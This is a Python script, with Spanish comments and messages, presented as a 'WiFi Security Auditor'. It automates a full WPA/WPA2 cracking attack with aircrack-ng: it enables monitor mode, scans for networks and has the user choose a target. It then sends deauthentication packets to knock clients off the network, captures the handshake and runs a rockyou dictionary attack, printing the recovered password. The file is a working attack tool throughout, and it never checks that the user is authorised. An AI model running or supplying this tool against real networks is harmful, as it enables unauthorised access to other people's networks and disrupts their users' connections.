#!/usr/bin/env python3
"""
WiFi Security Auditor - Automated Aircrack-ng Tool
"""

import subprocess
import sys
import time
import os
import re
from pathlib import Path

# Colores ANSI
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    """Muestra el banner ASCII del programa"""
    banner = f"""
{Colors.CYAN}
╦ ╦╦╔═╗╦  ╔═╗╦ ╦╔╦╗╦╔╦╗╔═╗╦═╗
║║║║╠╣ ║  ╠═╣║ ║ ║║║ ║ ║ ║╠╦╝
╚╩╝╩╚  ╩  ╩ ╩╚═╝═╩╝╩ ╩ ╚═╝╩╚═
     Security Auditor v1.0
{Colors.END}
{Colors.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}
    """
    print(banner)

def print_step(step_num, description):
    """Imprime un paso del proceso con formato"""
    print(f"\n{Colors.BOLD}{Colors.BLUE}[PASO {step_num}]{Colors.END} {Colors.CYAN}{description}{Colors.END}")
    print(f"{Colors.YELLOW}{'─' * 50}{Colors.END}")

def print_success(message):
    """Imprime mensaje de éxito"""
    print(f"{Colors.GREEN}✓ {message}{Colors.END}")

def print_error(message):
    """Imprime mensaje de error"""
    print(f"{Colors.RED}✗ {message}{Colors.END}")

def print_info(message):
    """Imprime mensaje informativo"""
    print(f"{Colors.CYAN}ℹ {message}{Colors.END}")

def check_root():
    """Verifica si el script se ejecuta como root"""
    if os.geteuid() != 0:
        print_error("Este script debe ejecutarse como root (sudo)")
        sys.exit(1)

def run_command(command, check=True, capture=True):
    """Ejecuta un comando y retorna el resultado"""
    try:
        if capture:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                check=check
            )
            return result
        else:
            result = subprocess.run(command, shell=True, check=check)
            return result
    except subprocess.CalledProcessError as e:
        print_error(f"Error ejecutando: {command}")
        return None

def get_wireless_interfaces():
    """Obtiene las interfaces WiFi disponibles"""
    result = run_command("iwconfig 2>&1")
    if not result:
        return []
    
    interfaces = []
    for line in result.stdout.split('\n'):
        if 'IEEE 802.11' in line:
            interface = line.split()[0]
            interfaces.append(interface)
    
    return interfaces

def enable_monitor_mode(interface):
    """Activa el modo monitor en la interfaz"""
    print_step(1, "Activando Modo Monitor")
    
    # Matar procesos interferentes
    print_info("Deteniendo procesos que pueden interferir...")
    run_command("airmon-ng check kill", check=False)
    
    # Activar modo monitor
    print_info(f"Activando modo monitor en {interface}...")
    result = run_command(f"airmon-ng start {interface}")
    
    if result and result.returncode == 0:
        # Buscar el nombre de la nueva interfaz
        if 'mon' in result.stdout:
            monitor_interface = interface + "mon"
            print_success(f"Modo monitor activado: {monitor_interface}")
            return monitor_interface
    
    print_error("No se pudo activar el modo monitor")
    return None

def scan_networks(monitor_interface, duration=10):
    """Escanea redes WiFi disponibles"""
    print_step(2, "Escaneando Redes WiFi")
    
    print_info(f"Escaneando durante {duration} segundos...")
    print_info("Presiona Ctrl+C para detener antes...")
    
    # Crear archivo temporal
    temp_file = "/tmp/wifi_scan"
    
    # Iniciar airodump-ng en background
    scan_cmd = f"timeout {duration} airodump-ng {monitor_interface} -w {temp_file} --output-format csv"
    
    try:
        subprocess.run(scan_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass
    
    time.sleep(1)
    
    # Leer resultados
    csv_file = f"{temp_file}-01.csv"
    networks = []
    
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            
        in_networks = False
        for line in lines:
            if 'BSSID' in line and 'PWR' in line:
                in_networks = True
                continue
            
            if in_networks and line.strip() and not line.startswith('Station'):
                parts = line.split(',')
                if len(parts) >= 14:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    encryption = parts[5].strip()
                    power = parts[8].strip()
                    essid = parts[13].strip()
                    
                    if essid and 'WPA' in encryption:
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'encryption': encryption,
                            'power': power,
                            'essid': essid
                        })
        
        # Limpiar archivos temporales
        run_command(f"rm -f {temp_file}*", check=False)
    
    return networks

def display_networks(networks):
    """Muestra las redes encontradas"""
    if not networks:
        print_error("No se encontraron redes WPA/WPA2")
        return
    
    print(f"\n{Colors.BOLD}Redes WiFi Encontradas:{Colors.END}")
    print(f"{Colors.YELLOW}{'─' * 80}{Colors.END}")
    print(f"{Colors.BOLD}{'#':<4} {'ESSID':<25} {'BSSID':<20} {'CH':<4} {'PWR':<6} {'ENC':<10}{Colors.END}")
    print(f"{Colors.YELLOW}{'─' * 80}{Colors.END}")
    
    for idx, net in enumerate(networks, 1):
        print(f"{idx:<4} {net['essid']:<25} {net['bssid']:<20} {net['channel']:<4} {net['power']:<6} {net['encryption']:<10}")
    
    print(f"{Colors.YELLOW}{'─' * 80}{Colors.END}")

def capture_handshake(monitor_interface, bssid, channel, essid, output_file):
    """Captura el handshake WPA"""
    print_step(3, f"Capturando Handshake de '{essid}'")
    
    print_info(f"Canal: {channel} | BSSID: {bssid}")
    print_info("Esperando handshake... (esto puede tomar unos minutos)")
    print_info("Se enviará un paquete de desautenticación para acelerar el proceso")
    
    # Comando para capturar
    capture_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {output_file} {monitor_interface}"
    
    # Iniciar captura en background
    capture_process = subprocess.Popen(
        capture_cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    # Esperar 3 segundos antes de desautenticar
    time.sleep(3)
    
    # Enviar paquetes de desautenticación
    print_info("Enviando paquetes de desautenticación...")
    deauth_cmd = f"timeout 5 aireplay-ng --deauth 10 -a {bssid} {monitor_interface}"
    subprocess.run(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Esperar un poco más para capturar el handshake
    print_info("Esperando captura del handshake...")
    time.sleep(10)
    
    # Terminar el proceso de captura
    capture_process.terminate()
    capture_process.wait()
    
    # Verificar si se capturó el handshake
    cap_file = f"{output_file}-01.cap"
    if os.path.exists(cap_file):
        # Verificar handshake con aircrack-ng
        verify_cmd = f"aircrack-ng {cap_file} 2>&1 | grep -i handshake"
        result = run_command(verify_cmd, check=False)
        
        if result and 'handshake' in result.stdout.lower():
            print_success(f"¡Handshake capturado exitosamente!")
            return cap_file
        else:
            print_error("No se detectó handshake en la captura")
            print_info("Intenta nuevamente o espera a que un dispositivo se conecte a la red")
            return None
    
    print_error("No se pudo crear el archivo de captura")
    return None

def crack_password(cap_file, bssid, wordlist):
    """Intenta crackear la contraseña usando un diccionario"""
    print_step(4, "Iniciando Ataque de Fuerza Bruta")
    
    if not os.path.exists(wordlist):
        print_error(f"El diccionario no existe: {wordlist}")
        return None
    
    # Contar líneas del diccionario
    count_result = run_command(f"wc -l {wordlist}")
    if count_result:
        word_count = count_result.stdout.split()[0]
        print_info(f"Diccionario: {wordlist} ({word_count} contraseñas)")
    
    print_info(f"Archivo de captura: {cap_file}")
    print_info(f"BSSID objetivo: {bssid}")
    print_info("Este proceso puede tomar desde segundos hasta horas...")
    print()
    
    # Ejecutar aircrack-ng
    crack_cmd = f"aircrack-ng -w {wordlist} -b {bssid} {cap_file}"
    
    print(f"{Colors.CYAN}Probando contraseñas...{Colors.END}\n")
    
    result = run_command(crack_cmd, capture=False)
    
    # Buscar la contraseña en la salida
    if result and result.returncode == 0:
        # Leer el archivo de captura nuevamente para extraer la clave
        verify_result = run_command(f"aircrack-ng -w {wordlist} -b {bssid} {cap_file}")
        if verify_result and 'KEY FOUND' in verify_result.stdout:
            # Extraer la contraseña
            match = re.search(r'KEY FOUND! \[ (.+?) \]', verify_result.stdout)
            if match:
                password = match.group(1)
                return password
    
    return None

def disable_monitor_mode(monitor_interface):
    """Desactiva el modo monitor"""
    print_step(5, "Limpiando y Restaurando Sistema")
    
    base_interface = monitor_interface.replace('mon', '')
    print_info(f"Desactivando modo monitor de {monitor_interface}...")
    run_command(f"airmon-ng stop {monitor_interface}", check=False)
    
    print_info("Reiniciando NetworkManager...")
    run_command("systemctl restart NetworkManager", check=False)
    
    print_success("Sistema restaurado")

def get_default_wordlist():
    """Obtiene la ruta del diccionario por defecto"""
    common_paths = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        str(Path.home() / "rockyou.txt")
    ]
    
    for path in common_paths:
        if os.path.exists(path):
            if path.endswith('.gz'):
                print_info("Descomprimiendo rockyou.txt...")
                run_command(f"gunzip {path}", check=False)
                return path.replace('.gz', '')
            return path
    
    return None

def main():
    """Función principal"""
    print_banner()
    
    # Verificar privilegios de root
    check_root()
    
    try:
        # Obtener interfaces WiFi
        print_info("Buscando interfaces WiFi...")
        interfaces = get_wireless_interfaces()
        
        if not interfaces:
            print_error("No se encontraron interfaces WiFi")
            sys.exit(1)
        
        print_success(f"Interfaces encontradas: {', '.join(interfaces)}")
        
        # Seleccionar interfaz
        if len(interfaces) == 1:
            selected_interface = interfaces[0]
            print_info(f"Usando interfaz: {selected_interface}")
        else:
            print("\nInterfaces disponibles:")
            for idx, iface in enumerate(interfaces, 1):
                print(f"  {idx}. {iface}")
            choice = int(input(f"{Colors.YELLOW}Selecciona una interfaz (número)\n>>> {Colors.END}"))
            selected_interface = interfaces[choice - 1]
        
        # Activar modo monitor
        monitor_interface = enable_monitor_mode(selected_interface)
        if not monitor_interface:
            sys.exit(1)
        
        # Escanear redes
        networks = scan_networks(monitor_interface, duration=15)
        
        if not networks:
            print_error("No se encontraron redes")
            disable_monitor_mode(monitor_interface)
            sys.exit(1)
        
        # Mostrar redes
        display_networks(networks)
        
        # Seleccionar red objetivo
        target_num = int(input(f"\n{Colors.YELLOW}Selecciona la red objetivo (número)\n>>> {Colors.END}"))
        target = networks[target_num - 1]
        
        # Capturar handshake
        output_file = "/tmp/handshake_capture"
        cap_file = capture_handshake(
            monitor_interface,
            target['bssid'],
            target['channel'],
            target['essid'],
            output_file
        )
        
        if not cap_file:
            print_error("No se pudo capturar el handshake")
            disable_monitor_mode(monitor_interface)
            sys.exit(1)
        
        # Obtener diccionario
        default_wordlist = get_default_wordlist()
        
        if default_wordlist:
            print_info(f"\nDiccionario por defecto encontrado: {default_wordlist}")
            use_default = input(f"{Colors.YELLOW}¿Usar este diccionario? (si/no)\n>>> {Colors.END}").lower()
            if use_default == 'si':
                wordlist = default_wordlist
            else:
                wordlist = input(f"{Colors.YELLOW}Ruta al diccionario personalizado\n>>> {Colors.END}")
        else:
            wordlist = input(f"{Colors.YELLOW}Ruta al diccionario\n>>> {Colors.END}")
        
        # Intentar crackear
        password = crack_password(cap_file, target['bssid'], wordlist)
        
        if password:
            print()
            print(f"{Colors.GREEN}{'═' * 60}{Colors.END}")
            print(f"{Colors.GREEN}{Colors.BOLD}🎉 ¡CONTRASEÑA ENCONTRADA! 🎉{Colors.END}")
            print(f"{Colors.GREEN}{'═' * 60}{Colors.END}")
            print(f"{Colors.BOLD}Red:{Colors.END} {target['essid']}")
            print(f"{Colors.BOLD}BSSID:{Colors.END} {target['bssid']}")
            print(f"{Colors.BOLD}Contraseña:{Colors.END} {Colors.YELLOW}{Colors.BOLD}{password}{Colors.END}")
            print(f"{Colors.GREEN}{'═' * 60}{Colors.END}")
        else:
            print()
            print(f"{Colors.RED}{'═' * 60}{Colors.END}")
            print(f"{Colors.RED}✗ No se encontró la contraseña en el diccionario{Colors.END}")
            print(f"{Colors.RED}{'═' * 60}{Colors.END}")
            print_info("Sugerencias:")
            print("  • Usa un diccionario más completo")
            print("  • Verifica que el handshake sea válido")
            print("  • La contraseña puede ser muy compleja")
        
        # Limpiar
        disable_monitor_mode(monitor_interface)
        
        # Limpiar archivos temporales
        print_info("\nLimpiando archivos temporales...")
        run_command(f"rm -f {output_file}*", check=False)
        
        print()
        print(f"{Colors.GREEN}{'═' * 60}{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}Proceso completado{Colors.END}")
        print(f"{Colors.GREEN}{'═' * 60}{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Proceso interrumpido por el usuario{Colors.END}")
        if 'monitor_interface' in locals():
            disable_monitor_mode(monitor_interface)
        sys.exit(0)
    except Exception as e:
        print_error(f"Error inesperado: {str(e)}")
        if 'monitor_interface' in locals():
            disable_monitor_mode(monitor_interface)
        sys.exit(1)

if __name__ == "__main__":
    main()